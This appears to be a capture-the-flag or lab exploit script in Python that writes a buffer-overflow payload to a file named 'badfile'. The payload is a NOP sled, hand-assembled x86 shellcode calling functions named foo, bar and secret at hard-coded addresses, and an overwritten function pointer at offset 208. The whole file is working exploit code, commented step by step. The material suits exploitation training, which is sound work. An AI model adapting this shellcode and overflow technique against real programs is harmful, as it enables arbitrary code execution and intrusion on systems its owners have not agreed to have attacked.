#!/usr/bin/env python3

def p32(a): return (a).to_bytes(4, 'little')

# mov eax, 0x5fffffff ; 0x5fffffff 
# shr eax, 28         ; 0x00000005
# push eax            ; push arg of foo
# mov eax, 0x565561ed ; Address of foo function
# call eax            ; call foo function
# push eax            ; push return value of foo as arg of bar
# mov eax, 0x5655623a ; Address of bar function
# call eax            ; call bar function
# mov eax, 0x56556268 ; Address of secret function
# call eax            ; call secret function
shellcode = b"\xB8\xFF\xFF\xFF\x5F\xC1\xE8\x1C\x50\xB8\xED\x61\x55\x56\xFF\xD0\x50\xB8\x3A\x62\x55\x56\xFF\xD0\xB8\x68\x62\x55\x56\xFF\xD0"

fp_offset = 208 # offset for function pointer fp, location found using cyclic

payload = b"\x90" * (fp_offset - len(shellcode)) # fill the gap with nops
payload += shellcode # add shellcode

# 0xffffc368 is $ebp in vuln function
# 150 is offset for non-gdb run
# 50 is to offset $eip
payload += p32(0xffffc368 + 150 + 50)


with open('badfile', 'wb') as f:
    f.write(payload)

